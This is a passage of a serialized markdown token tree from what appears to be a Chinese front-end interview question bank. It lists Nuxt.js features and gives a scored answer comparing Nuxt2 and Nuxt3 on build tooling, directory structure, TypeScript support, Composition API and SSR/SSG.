支持服务器端渲染，可以提高网站的性能和搜索引擎优化。\\n","task":false,"loose":false,"text":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","tokens":[{"type":"text","raw":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","text":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","text":" 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。\\n","task":false,"loose":false,"text":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","tokens":[{"type":"text","raw":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","text":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","text":" 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。\\n","task":false,"loose":false,"text":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","tokens":[{"type":"text","raw":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","text":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","text":" 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。\\n","task":false,"loose":false,"text":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","tokens":[{"type":"text","raw":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","text":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","text":" 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。\\n","task":false,"loose":false,"text":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","tokens":[{"type":"text","raw":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","text":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","text":" 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。\\n","task":false,"loose":false,"text":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","tokens":[{"type":"text","raw":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","text":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","text":" 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","task":false,"loose":false,"text":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","tokens":[{"type":"text","raw":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","text":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","text":" 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt2和nuxt3的区别\\n\\n","depth":2,"text":"nuxt2和nuxt3的区别","tokens":[{"type":"text","raw":"nuxt2和nuxt3的区别","text":"nuxt2和nuxt3的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。\\n* **1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。\\n* **1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。\\n* **1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。\\n* **2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。\\n","task":false,"loose":false,"text":"**1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","tokens":[{"type":"text","raw":"**1：** 性能方面：<br/>\\n\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\n\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","text":"**1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能方面：","text":" 性能方面：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 ","text":"\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 ","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","text":"\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。\\n","task":false,"loose":false,"text":"**1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","tokens":[{"type":"text","raw":"**1：** 目录结构和文件约定：<br/>\\n\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n\\n允许更好地定制页面布局。<br/>\\n\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","text":"**1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 目录结构和文件约定：","text":" 目录结构和文件约定：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。","text":"\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","text":"\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。\\n","task":false,"loose":false,"text":"**1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","tokens":[{"type":"text","raw":"**1：** TypeScript 支持：<br/>\\n\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n\\n开发体验更加友好。<br/>\\n\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","text":"**1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TypeScript 支持：","text":" TypeScript 支持：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。","text":"\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","text":"\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。\\n","task":false,"loose":false,"text":"**1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","tokens":[{"type":"text","raw":"**1：** Composition API 和 Options API：<br/>\\n\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","text":"**1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Composition API 和 Options API：","text":" Composition API 和 Options 